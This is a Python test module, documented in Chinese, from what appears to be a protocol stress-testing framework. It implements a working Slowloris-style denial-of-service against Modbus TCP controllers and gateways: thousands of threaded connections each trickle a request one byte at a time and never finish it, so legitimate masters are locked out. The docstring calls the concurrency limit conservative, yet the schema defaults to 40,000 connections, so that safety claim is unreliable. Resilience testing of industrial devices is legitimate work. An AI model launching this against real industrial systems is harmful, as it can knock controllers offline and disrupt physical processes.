"""
測項：Modbus TCP 緩慢 MBAP Header 連線耗盡測試（Slowloris-style）
分類：Modbus TCP（資源消耗型，非單純流量型）
說明：跟 conn_pool_exhaustion.py（單純建立大量 TCP 連線、佔滿連線數上限）不同，這是
「應用層 Slowloris」的 Modbus 版本：建立連線後，每條連線只用極慢的速度、一次送一小段
（甚至一個 byte）MBAP Header（正常只有 7 bytes：Transaction ID 2 + Protocol ID 2 +
Length 2 + Unit ID 1），永遠不把一個完整、合法的請求送完。許多 Modbus TCP Slave/Gateway
韌體在「已接受 TCP 連線、正在等待完整 MBAP+PDU 到齊」這個狀態下，會為每條連線保留
一塊解析緩衝區（甚至啟動逾時計時器），如果韌體沒有做好「等待資料逾時」的保護（或逾時
設得很長），大量這種「連線建立了但請求永遠送不完」的連線會佔用遠比單純 TCP 連線更久的
資源保留時間，且部分韌體對這種「連線數尚未達上限但都卡在半個請求」的情境處理路徑，跟
處理單純大量新建 TCP 連線的路徑不同，值得分開測試。

安全設計：
  - 送出的位元組全部來自一個結構正確、內容無害的 MBAP Header 前綴（FC03 讀請求），
    只是刻意切成很多小段、每段之間插入延遲，不會讓請求真的送完、也不含任何寫入操作。
  - 併發連線數比照 generic/tcp_conn_flood.py 的安全上限與分批建立模式（避免攻擊端一次
    生成過多 OS 執行緒）。
  - 每條連線各自在自己的執行緒裡緩慢送位元組，執行緒數＝連線數，因此併發連線數上限
    刻意設得比純 TCP Connection Flood 更保守（每條連線存活時間長，執行緒數是持續性
    負擔，不是像純連線建立那樣可以快速建完就交給 OS 管理）。

技術定位說明（回應「Slowloris 是不是只能打 HTTP」的疑問）：
  Slowloris 的核心原理並非針對 HTTP 協定本身，而是針對「伺服器端為每條已接受但尚未
  收到完整請求的連線保留資源、且對這種半連線沒有足夠嚴格逾時控管」這個共通弱點，
  任何走 TCP、且採「先接受連線 → 等資料到齊才解析」模式的服務都可能受影響，HTTP
  只是它最早、最知名的示範對象。對 Modbus TCP 而言，這個手法不但適用，實務上反而
  可能比對現代網頁伺服器更容易奏效：現代 Web 伺服器（nginx/Apache 等）通常具備
  數千甚至數萬併發連線的架構與逾時防護（如 nginx 的 client_header_timeout），
  門檻很高；但多數 Modbus TCP Slave/Gateway 韌體受限於嵌入式硬體資源，同時能處理的
  TCP 連線數常只有個位數到數十（遠低於 conn_pool_exhaustion.py 測到的「總連線數
  上限」門檻），且往往缺乏針對「連線已建立但遲遲未送完整請求」這種半連線狀態的
  逾時保護。也就是說，只要用遠少於打垮一般網頁伺服器所需的連線數，就有機會讓
  Modbus 裝置的連線資源被占滿，導致合法 Master 無法建立新連線——這正是本測項
  相對於單純連線洪水（conn_pool_exhaustion.py）與高頻率讀寫洪水（fc03/fc16 等）
  額外要驗證的資源耗盡面向。
"""
import socket
import struct
import threading
import time

from ..common import clamp_duration

NAME = "Modbus 緩慢 MBAP Header 連線耗盡測試（Slowloris 式）"
CATEGORY = "Modbus TCP"
PROTOCOL = "TCP"
DEFAULT_PORT = 502
TEST_TYPE = "resource"  # 半連線佔用逾時計時器/解析緩衝區資源，非單純比流量大小

_SPAWN_BATCH_SIZE = 80
_SPAWN_BATCH_STAGGER_SEC = 0.05


def get_param_schema() -> dict:
    return {
        "concurrent_connections": {
            "type": "int", "default": 40000, "min": 1, "max": 40000,
            "desc": "同時維持的「半送出」連線數（每條連線佔用一個執行緒持續緩慢送資料，上限比純連線洪水更保守）",
        },
        "trickle_interval_sec": {
            "type": "float", "default": 5.0, "min": 0.5, "max": 30.0,
            "desc": "每條連線兩次送出位元組之間的間隔秒數（越長，該連線佔用資源的時間越久）",
        },
        "connect_timeout": {"type": "float", "default": 3.0, "min": 0.5, "max": 10.0, "desc": "單一連線逾時秒數"},
    }


def _build_partial_frame(unit_id: int = 1) -> bytes:
    """組一個結構正確的 FC03 讀請求 MBAP+PDU（總長 12 bytes），但只會被分段緩慢送出，
    永遠不會在一次 sendall 內送完整——這正是本測項要測的「半個請求」狀態。"""
    pdu = struct.pack(">BHH", 0x03, 0x0000, 0x0001)  # FC03, addr=0, count=1（無害的最小讀請求）
    mbap = struct.pack(">HHHB", 1, 0x0000, len(pdu) + 1, unit_id)
    return mbap + pdu


def run(target, port, protocol, duration, params, stop_event, log_fn):
    duration = clamp_duration(duration)
    n = int(params.get("concurrent_connections", 200))
    trickle_interval = float(params.get("trickle_interval_sec", 5.0))
    connect_timeout = float(params.get("connect_timeout", 3.0))

    frame = _build_partial_frame()
    stats_lock = threading.Lock()
    stats = {"connected": 0, "connect_failed": 0, "closed_by_peer": 0, "bytes_trickled": 0}
    end_time = time.time() + duration

    def _trickle_one():
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(connect_timeout)
            s.connect((target, port))
        except OSError:
            with stats_lock:
                stats["connect_failed"] += 1
            return
        with stats_lock:
            stats["connected"] += 1
        s.settimeout(trickle_interval + 2.0)
        try:
            idx = 0
            while idx < len(frame) and time.time() < end_time and not (stop_event and stop_event.is_set()):
                try:
                    s.sendall(frame[idx:idx + 1])  # 一次只送 1 byte
                    idx += 1
                    with stats_lock:
                        stats["bytes_trickled"] += 1
                except OSError:
                    with stats_lock:
                        stats["closed_by_peer"] += 1
                    return
                # 送完全部 bytes 後就是一個完整合法請求了——為了維持「半送出」狀態，
                # 送到倒數第二個 byte 就原地停住、不送最後一個 byte，直到測試結束或被停止。
                if idx >= len(frame) - 1:
                    while time.time() < end_time and not (stop_event and stop_event.is_set()):
                        time.sleep(min(1.0, max(0.1, end_time - time.time())))
                    break
                time.sleep(trickle_interval)
        finally:
            try:
                s.close()
            except OSError:
                pass

    log_fn(f"[+] 開始緩慢 MBAP Header 連線耗盡測試：{n} 條連線 -> {target}:{port}，"
           f"每段間隔 {trickle_interval} 秒（分批建立，每批 {_SPAWN_BATCH_SIZE} 條）")

    threads = []
    for batch_start in range(0, n, _SPAWN_BATCH_SIZE):
        if stop_event is not None and stop_event.is_set():
            log_fn("[!] stop_event 觸發，停止繼續建立新連線")
            break
        batch = [threading.Thread(target=_trickle_one, daemon=True)
                 for _ in range(min(_SPAWN_BATCH_SIZE, n - batch_start))]
        for t in batch:
            t.start()
        threads.extend(batch)
        if batch_start + _SPAWN_BATCH_SIZE < n:
            time.sleep(_SPAWN_BATCH_STAGGER_SEC)

    for t in threads:
        t.join(timeout=duration + connect_timeout + trickle_interval + 5)

    with stats_lock:
        result = dict(stats)
    result["elapsed_sec"] = round(duration, 1)
    log_fn(
        f"[+] 完成，成功建立 {result['connected']} 條連線（{result['connect_failed']} 條連線失敗），"
        f"共送出 {result['bytes_trickled']} 個位元組，{result['closed_by_peer']} 條連線被對方主動關閉"
    )
    return result
